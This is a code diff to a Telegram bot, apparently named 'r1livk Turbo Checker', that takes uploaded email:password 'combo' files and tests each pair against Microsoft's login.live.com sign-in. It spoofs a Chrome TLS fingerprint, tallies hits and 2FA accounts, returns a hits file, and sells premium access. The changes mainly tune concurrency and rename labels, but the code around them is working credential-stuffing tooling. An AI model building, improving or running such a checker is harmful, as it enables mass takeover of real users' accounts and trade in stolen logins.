@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Ultimate Async Checker ⚡ - Telegram Bot (AsyncIO + TLS Spoofing Edition)
-Optimized for Direct High-Speed Scanning & Zero False-Positives
+r1livk Ultimate Async Checker ⚡ - Telegram Bot (Stable Direct Edition)
+Optimized for 100% Completion & Zero Freezes on Direct Connection
 """
 
 import os
@@ -58,8 +58,8 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 15
-CONCURRENT_LIMIT = 10  # عدد العمليات المتزامنة الآمنة للاتصال المباشر (Direct)
+REQUEST_TIMEOUT = 12
+CONCURRENT_LIMIT = 3  # تم تخفيضها لتكون مستقرة 100% بدون أي تعليق أو توقف منتصف الفحص
 
 active_scans = {}
 user_usage = {}  
@@ -140,8 +140,8 @@ async def check_single_account_async(combo):
     email = parts[0].strip()
     password = ':'.join(parts[1:]).strip()
     
-    async with AsyncSession(impersonate="chrome120") as session:
-        try:
+    try:
+        async with AsyncSession(impersonate="chrome120") as session:
             sftag_url = (
                 "https://login.live.com/oauth20_authorize.srf"
                 "?client_id=00000000402B5328"
@@ -275,8 +275,8 @@ async def check_single_account_async(combo):
             
             return "hit", {"content": hit_info}
 
-        except Exception as e:
-            return "error", str(e)
+    except Exception as e:
+        return "error", str(e)
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -305,7 +305,7 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("⚡ Start Async Turbo Checker", callback_data="start_checker")
+    btn_start = types.InlineKeyboardButton("⚡ Start Stable Turbo Checker", callback_data="start_checker")
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
@@ -320,8 +320,8 @@ def show_main_menu(message):
         status_text = f"👤 Free ({used}/3500 lines today)"
 
     text = (
-        "⚡ **r1livk Async Turbo Checker - V4.0** ⚡\n\n"
-        "Powered by AsyncIO & TLS Spoofing (Direct Mode).\n"
+        "⚡ **r1livk Stable Turbo Checker - V4.1** ⚡\n\n"
+        "Optimized for 100% full completion without freezes.\n"
         f"Your Status: {status_text}\n\n"
         "Please select an option below:"
     )
@@ -357,7 +357,7 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🎮 **Async Turbo Mode (>0G & TLS Spoofed)**\n\n"
+            "🎮 **Stable Turbo Mode (>0G & No Freezes)**\n\n"
             "Please send your combo file in `.txt` format (`email:password`)"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
@@ -403,10 +403,10 @@ def callback_query(call):
     elif call.data == "my_account":
         today = str(date.today())
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: Async Turbo", show_alert=True)
+            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: Stable Turbo", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Status: Free ({used}/3500 lines)\nMode: Async Turbo", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Free ({used}/3500 lines)\nMode: Stable Turbo", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -434,12 +434,11 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Async Turbo Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Stable Turbo Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
         
-        # تشغيل حلقة الـ Async في الخلفية
         import threading
         threading.Thread(target=run_async_checker_thread, args=(chat_id, local_path, lines, username)).start()
 
@@ -458,7 +457,7 @@ async def process_async_checker(chat_id, filepath, lines, username):
     errors = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_AsyncHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_StableHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -467,7 +466,7 @@ async def process_async_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **ASYNC TURBO SCAN STATS**\n\n"
+        f"🔥 **STABLE TURBO SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
@@ -503,7 +502,6 @@ async def process_async_checker(chat_id, filepath, lines, username):
 
     tasks = [bound_worker(line) for line in lines]
     
-    # حلقة تحديث الشاشة أثناء الفحص
     async def update_progress():
         while active_scans.get(chat_id, True) and checked < total:
             await asyncio.sleep(1.0)
@@ -515,7 +513,7 @@ async def process_async_checker(chat_id, filepath, lines, username):
                 pct = (checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **ASYNC TURBO SCAN (Live)**\n\n"
+                    f"🔥 **STABLE TURBO SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {checked} ({pct:.1f}%)\n"
                     f"🔒 2FA: {tfa_count}\n"
@@ -554,8 +552,8 @@ async def process_async_checker(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"📁 **Async Turbo Hits File (>0G):** {output_filename}")
+            bot.send_document(chat_id, f, caption=f"📁 **Stable Hits File (>0G):** {output_filename}")
 
 if __name__ == "__main__":
-    print("🚀 r1livk Async Turbo Checker Bot is running...")
+    print("🚀 r1livk Stable Turbo Checker Bot is running...")
     bot.infinity_polling()
